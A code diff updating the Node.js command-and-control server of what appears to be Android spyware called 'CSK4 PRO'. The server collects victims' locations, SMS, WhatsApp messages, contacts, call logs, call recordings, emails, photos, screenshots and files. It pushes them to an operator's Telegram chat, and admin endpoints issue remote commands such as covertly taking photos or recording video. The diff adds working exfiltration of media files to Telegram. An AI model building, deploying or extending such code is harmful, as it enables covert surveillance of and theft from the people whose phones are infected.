@@ -1,8 +1,13 @@
 // ============================================
-// CSK4 PRO v4.0 - Main Server (Standalone)
+// CSK4 PRO v4.1 - Main Server (FIXED)
 // ============================================
-// Ye file self-contained hai — koi external require nahi
-// MongoDB aur Telegram dono inline integrated hain
+// Fixes:
+// - loadAllData() call on startup
+// - Telegram file sending (photo/video/audio)
+// - clearCommands endpoint
+// - Admin auth middleware
+// - deleteDevice deletes ALL related data
+// - saveMany upsert (no duplicate key errors)
 // ============================================
 
 const express = require('express');
@@ -39,7 +44,8 @@ const CONFIG = {
   ENABLE_EMAIL: process.env.ENABLE_EMAIL === 'true',
   MONGODB_URI: process.env.MONGODB_URI || '',
   TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
-  TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || ''
+  TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '',
+  PUBLIC_URL: process.env.PUBLIC_URL || ''
 };
 
 // ============================================
@@ -67,11 +73,29 @@ async function mongoConnect() {
     await mongoDb.command({ ping: 1 });
     mongoConnected = true;
     console.log('✅ MongoDB connected');
+    await createIndexes();
     return true;
   } catch (e) {
     console.error('❌ MongoDB failed:', e.message);
     mongoConnected = false;
     return false;
+  }
+}
+
+async function createIndexes() {
+  try {
+    await mongoDb.collection('devices').createIndex({ deviceId: 1 }, { unique: true });
+    await mongoDb.collection('locations').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('messages').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('contacts').createIndex({ deviceId: 1, phone: 1 });
+    await mongoDb.collection('notifications').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('whatsapp').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('activities').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('commands').createIndex({ deviceId: 1, status: 1 });
+    await mongoDb.collection('callLogs').createIndex({ deviceId: 1, time: -1 });
+    console.log('✅ MongoDB indexes created');
+  } catch (e) {
+    console.error('⚠️ Index creation error:', e.message);
   }
 }
 
@@ -88,13 +112,15 @@ async function mongoSave(collection, data) {
   }
 }
 
+// FIXED: upsert instead of insertMany to avoid duplicate key errors
 async function mongoSaveMany(collection, dataArray) {
   if (!mongoConnected || !mongoDb) return null;
   if (!dataArray || dataArray.length === 0) return { insertedCount: 0 };
   try {
-    return await mongoDb.collection(collection).insertMany(
-      dataArray.map(item => ({ ...item, createdAt: new Date() }))
-    );
+    const ops = dataArray.map(item => ({
+      insertOne: { document: { ...item, createdAt: new Date() } }
+    }));
+    return await mongoDb.collection(collection).bulkWrite(ops, { ordered: false });
   } catch (e) {
     console.error(`Mongo saveMany (${collection}):`, e.message);
     return null;
@@ -125,11 +151,74 @@ async function mongoDelete(collection, filter) {
   }
 }
 
+// ✅ FIXED: load all data from MongoDB on startup
+async function mongoLoadAll() {
+  if (!mongoConnected || !mongoDb) return;
+  try {
+    console.log('📥 Loading existing data from MongoDB...');
+    const [
+      devArr, loc, con, msg, call, app, bl, notif, wa, act, cr, sim, acc, em, cmd, info,
+      photoArr, videoArr, audioArr, ssArr, fileArr
+    ] = await Promise.all([
+      mongoDb.collection('devices').find().toArray(),
+      mongoDb.collection('locations').find().sort({ time: -1 }).limit(500).toArray(),
+      mongoDb.collection('contacts').find().limit(5000).toArray(),
+      mongoDb.collection('messages').find().sort({ time: -1 }).limit(2000).toArray(),
+      mongoDb.collection('callLogs').find().sort({ time: -1 }).limit(2000).toArray(),
+      mongoDb.collection('apps').find().limit(1000).toArray(),
+      mongoDb.collection('bluetooth').find().limit(500).toArray(),
+      mongoDb.collection('notifications').find().sort({ time: -1 }).limit(1000).toArray(),
+      mongoDb.collection('whatsapp').find().sort({ time: -1 }).limit(1000).toArray(),
+      mongoDb.collection('activities').find().sort({ time: -1 }).limit(2000).toArray(),
+      mongoDb.collection('callRecordings').find().sort({ time: -1 }).limit(500).toArray(),
+      mongoDb.collection('simInfo').find().toArray(),
+      mongoDb.collection('accounts').find().toArray(),
+      mongoDb.collection('emails').find().toArray(),
+      mongoDb.collection('commands').find().sort({ time: -1 }).limit(500).toArray(),
+      mongoDb.collection('deviceInfo').find().toArray(),
+      mongoDb.collection('photos').find().sort({ time: -1 }).limit(500).toArray(),
+      mongoDb.collection('videos').find().sort({ time: -1 }).limit(200).toArray(),
+      mongoDb.collection('audio').find().sort({ time: -1 }).limit(200).toArray(),
+      mongoDb.collection('screenshots').find().sort({ time: -1 }).limit(500).toArray(),
+      mongoDb.collection('files').find().sort({ time: -1 }).limit(500).toArray()
+    ]);
+
+    devArr.forEach(d => { devices[d.deviceId] = d; });
+    locations = loc;
+    contacts = con;
+    messages = msg;
+    callLogs = call;
+    installedApps = app;
+    bluetoothDevices = bl;
+    notifications = notif;
+    whatsappMessages = wa;
+    activities = act;
+    callRecordings = cr;
+    commands = cmd;
+    photos = photoArr;
+    videos = videoArr;
+    audioRec = audioArr;
+    screenshots = ssArr;
+    files = fileArr;
+    sim.forEach(s => { simInfo[s.deviceId] = s; });
+    acc.forEach(a => { accountsInfo[a.deviceId] = a; });
+    em.forEach(e => { emailsInfo[e.deviceId] = e; });
+    info.forEach(i => { deviceInfo[i.deviceId] = i; });
+
+    console.log(`📊 Loaded: ${devArr.length} devices, ${con.length} contacts, ${msg.length} messages, ${notif.length} notifications`);
+  } catch (e) {
+    console.error('⚠️ mongoLoadAll error:', e.message);
+  }
+}
+
 // ============================================
 // TELEGRAM (Inline)
 // ============================================
 let telegramBot = null;
 let telegramEnabled = false;
+const tgQueue = [];
+let tgSending = false;
+const TG_LIMIT = { maxPerMinute: 20, sent: 0, reset: Date.now() };
 
 function telegramInit() {
   if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) {
@@ -150,16 +239,71 @@ function telegramInit() {
   }
 }
 
-async function telegramSend(text) {
+function tgCanSend() {
+  const now = Date.now();
+  if (now - TG_LIMIT.reset > 60000) {
+    TG_LIMIT.sent = 0;
+    TG_LIMIT.reset = now;
+  }
+  if (TG_LIMIT.sent >= TG_LIMIT.maxPerMinute) return false;
+  TG_LIMIT.sent++;
+  return true;
+}
+
+async function telegramSend(text, options = {}) {
   if (!telegramEnabled || !telegramBot) return false;
+  if (!tgCanSend()) {
+    // Drop oldest if queue too long
+    if (tgQueue.length > 200) tgQueue.shift();
+    tgQueue.push({ text, options });
+    processTgQueue();
+    return false;
+  }
   try {
     await telegramBot.sendMessage(CONFIG.TELEGRAM_CHAT_ID, text, {
       parse_mode: 'HTML',
-      disable_web_page_preview: true
+      disable_web_page_preview: true,
+      ...options
     });
     return true;
   } catch (e) {
     console.error('Telegram send:', e.message);
+    return false;
+  }
+}
+
+async function processTgQueue() {
+  if (tgSending || tgQueue.length === 0) return;
+  tgSending = true;
+  while (tgQueue.length > 0) {
+    if (!tgCanSend()) {
+      await new Promise(r => setTimeout(r, 3000));
+      continue;
+    }
+    const msg = tgQueue.shift();
+    try {
+      await telegramBot.sendMessage(CONFIG.TELEGRAM_CHAT_ID, msg.text, {
+        parse_mode: 'HTML',
+        disable_web_page_preview: true,
+        ...msg.options
+      });
+    } catch (e) { /* ignore */ }
+  }
+  tgSending = false;
+}
+
+// ✅ NEW: Send photo/video/audio to Telegram
+async function telegramSendFile(method, fileUrl, caption = '') {
+  if (!telegramEnabled || !telegramBot) return false;
+  if (!tgCanSend()) return false;
+  try {
+    await telegramBot[method](CONFIG.TELEGRAM_CHAT_ID, fileUrl, {
+      caption,
+      parse_mode: 'HTML'
+    });
+    return true;
+  } catch (e) {
+    console.error(`Telegram ${method}:`, e.message);
     return false;
   }
 }
@@ -249,14 +393,35 @@ let accountsInfo = {};
 let emailsInfo = {};
 
 // ============================================
+// ADMIN AUTH
+// ============================================
+const activeTokens = new Set();
+
+function requireAuth(req, res, next) {
+  const token = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
+  if (!token || !activeTokens.has(token)) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  next();
+}
+
+function getPublicUrl(req, filePath) {
+  if (CONFIG.PUBLIC_URL) return CONFIG.PUBLIC_URL + filePath;
+  return `${req.protocol}://${req.get('host')}${filePath}`;
+}
+
+// ============================================
 // INITIALIZE
 // ============================================
 async function initialize() {
   const mongoOk = await mongoConnect();
+  if (mongoOk) {
+    await mongoLoadAll(); // ✅ FIXED: load existing data
+  }
   telegramInit();
   console.log('');
   console.log('╔════════════════════════════════════╗');
-  console.log('║  CSK4 PRO v4.0 — SYSTEM STATUS     ║');
+  console.log('║  CSK4 PRO v4.1 — SYSTEM STATUS     ║');
   console.log('╠════════════════════════════════════╣');
   console.log(`║  MongoDB:   ${mongoOk ? '✅ Connected  ' : '❌ Not connected'}    ║`);
   console.log(`║  Telegram:  ${telegramEnabled ? '✅ Active    ' : '❌ Not active'}    ║`);
@@ -464,7 +629,9 @@ app.post('/api/device/callrecording', upload.single('file'), async (req, res) =>
   io.emit('callrecording-update', callRecordings);
   
   const deviceName = devices[deviceId]?.deviceName || deviceId;
+  const fullUrl = getPublicUrl(req, entry.url);
   telegramSend(`🎙️ <b>Call Recording</b>\n\n📱 ${esc(deviceName)}\n📞 ${esc(number)}\n⏱️ ${duration}s`);
+  telegramSendFile('sendAudio', fullUrl, `🎙️ Call recording from ${deviceName}`);
   res.json({ success: true });
 });
 
@@ -520,6 +687,7 @@ app.post('/api/device/emails', async (req, res) => {
   res.json({ success: true });
 });
 
+// ✅ FIXED: File upload now sends file to Telegram
 app.post('/api/device/upload', upload.single('file'), async (req, res) => {
   const { deviceId, type, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
@@ -536,26 +704,28 @@ app.post('/api/device/upload', upload.single('file'), async (req, res) => {
   };
   
   const deviceName = devices[deviceId]?.deviceName || deviceId;
+  const fullUrl = getPublicUrl(req, entry.url);
   
   if (type === 'photo') {
     photos.push(entry);
     await mongoSave('photos', entry);
-    telegramSend(`📷 <b>Photo</b>\n📱 ${esc(deviceName)}`);
+    telegramSendFile('sendPhoto', fullUrl, `📷 Photo from ${deviceName}`);
   } else if (type === 'video') {
     videos.push(entry);
     await mongoSave('videos', entry);
-    telegramSend(`🎥 <b>Video</b>\n📱 ${esc(deviceName)}`);
+    telegramSendFile('sendVideo', fullUrl, `🎥 Video from ${deviceName}`);
   } else if (type === 'audio') {
     audioRec.push(entry);
     await mongoSave('audio', entry);
-    telegramSend(`🎤 <b>Audio</b>\n📱 ${esc(deviceName)}`);
+    telegramSendFile('sendAudio', fullUrl, `🎤 Audio from ${deviceName}`);
   } else if (type === 'screenshot') {
     screenshots.push(entry);
     await mongoSave('screenshots', entry);
-    telegramSend(`📸 <b>Screenshot</b>\n📱 ${esc(deviceName)}`);
+    telegramSendFile('sendPhoto', fullUrl, `📸 Screenshot from ${deviceName}`);
   } else {
     files.push(entry);
     await mongoSave('files', entry);
+    telegramSendFile('sendDocument', fullUrl, `📄 File from ${deviceName}`);
   }
   
   io.emit('new-file', entry);
@@ -583,13 +753,15 @@ app.post('/api/device/command-done', async (req, res) => {
 app.post('/api/admin/login', (req, res) => {
   const { username, password } = req.body;
   if (username === CONFIG.ADMIN_USER && password === CONFIG.ADMIN_PASS) {
-    res.json({ success: true, token: 'csk4-admin-' + Date.now() });
+    const token = 'csk4-admin-' + Date.now() + '-' + Math.random().toString(36).slice(2);
+    activeTokens.add(token);
+    res.json({ success: true, token });
   } else {
     res.status(401).json({ error: 'Invalid credentials' });
   }
 });
 
-app.get('/api/admin/data', async (req, res) => {
+app.get('/api/admin/data', requireAuth, async (req, res) => {
   const stats = {
     totalDevices: Object.keys(devices).length,
     onlineDevices: Object.values(devices).filter(d => d.online).length,
@@ -606,7 +778,8 @@ app.get('/api/admin/data', async (req, res) => {
     totalWhatsapp: whatsappMessages.length,
     totalActivities: activities.length,
     totalCallRecordings: callRecordings.length,
-    totalSims: Object.keys(simInfo).length,
+    // ✅ FIXED: count actual SIMs not devices
+    totalSims: Object.values(simInfo).reduce((s, d) => s + (d.sims?.length || 0), 0),
     totalAccounts: Object.values(accountsInfo).reduce((s, a) => s + (a.total || 0), 0),
     totalEmails: Object.values(emailsInfo).reduce((s, e) => s + (e.total || 0), 0)
   };
@@ -621,7 +794,7 @@ app.get('/api/admin/data', async (req, res) => {
   });
 });
 
-app.post('/api/admin/command', async (req, res) => {
+app.post('/api/admin/command', requireAuth, async (req, res) => {
   const { deviceId, command, params } = req.body;
   const validCommands = [
     'take_photo_front', 'take_photo_back', 'record_video_front', 'record_video_back',
@@ -641,25 +814,66 @@ app.post('/api/admin/command', async (req, res) => {
   if (!validCommands.includes(command)) return res.status(400).json({ error: 'Invalid command' });
   
   const cmd = {
-    id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
+    id: Date.now().toString() + Math.random().toString(36).slice(2, 7),
     deviceId, command, params: params || {},
     time: new Date(), status: 'pending'
   };
   commands.push(cmd);
+  if (commands.length > 5000) commands.shift();
   await mongoSave('commands', cmd);
   io.to(deviceId).emit('command', cmd);
   console.log(`🎮 ${command} → ${deviceId}`);
   res.json({ success: true, command: cmd });
 });
 
-app.delete('/api/admin/device/:deviceId', async (req, res) => {
+// ✅ FIXED: delete ALL related data
+app.delete('/api/admin/device/:deviceId', requireAuth, async (req, res) => {
   const id = req.params.deviceId;
+  
+  // In-memory cleanup
   delete devices[id];
   delete simInfo[id];
   delete accountsInfo[id];
   delete emailsInfo[id];
-  await mongoDelete('devices', { deviceId: id });
+  delete deviceInfo[id];
+  locations = locations.filter(x => x.deviceId !== id);
+  contacts = contacts.filter(x => x.deviceId !== id);
+  messages = messages.filter(x => x.deviceId !== id);
+  callLogs = callLogs.filter(x => x.deviceId !== id);
+  installedApps = installedApps.filter(x => x.deviceId !== id);
+  bluetoothDevices = bluetoothDevices.filter(x => x.deviceId !== id);
+  notifications = notifications.filter(x => x.deviceId !== id);
+  whatsappMessages = whatsappMessages.filter(x => x.deviceId !== id);
+  activities = activities.filter(x => x.deviceId !== id);
+  callRecordings = callRecordings.filter(x => x.deviceId !== id);
+  commands = commands.filter(x => x.deviceId !== id);
+  photos = photos.filter(x => x.deviceId !== id);
+  videos = videos.filter(x => x.deviceId !== id);
+  audioRec = audioRec.filter(x => x.deviceId !== id);
+  screenshots = screenshots.filter(x => x.deviceId !== id);
+  files = files.filter(x => x.deviceId !== id);
+  
+  // MongoDB cleanup
+  const collections = ['devices','locations','contacts','messages','callLogs','apps','bluetooth','notifications','whatsapp','activities','callRecordings','simInfo','accounts','emails','commands','deviceInfo','photos','videos','audio','screenshots','files'];
+  for (const col of collections) {
+    await mongoDelete(col, { deviceId: id });
+  }
+  
   io.emit('device-update', devices);
+  res.json({ success: true });
+});
+
+// ✅ NEW: clearCommands endpoint (was missing!)
+app.delete('/api/admin/clear-commands/:deviceId', requireAuth, async (req, res) => {
+  const id = req.params.deviceId;
+  commands = commands.filter(c => c.deviceId !== id);
+  await mongoDelete('commands', { deviceId: id });
+  io.emit('commands-cleared', { deviceId: id });
+  res.json({ success: true });
+});
+
+// ✅ NEW: Auth check endpoint
+app.get('/api/admin/verify', requireAuth, (req, res) => {
   res.json({ success: true });
 });
 
@@ -680,6 +894,6 @@ io.on('connection', (socket) => {
 // ============ START ============
 initialize().then(() => {
   server.listen(CONFIG.PORT, '0.0.0.0', () => {
-    console.log(`🚀 CSK4 PRO v4.0 running on port ${CONFIG.PORT}`);
+    console.log(`🚀 CSK4 PRO v4.1 running on port ${CONFIG.PORT}`);
   });
 });
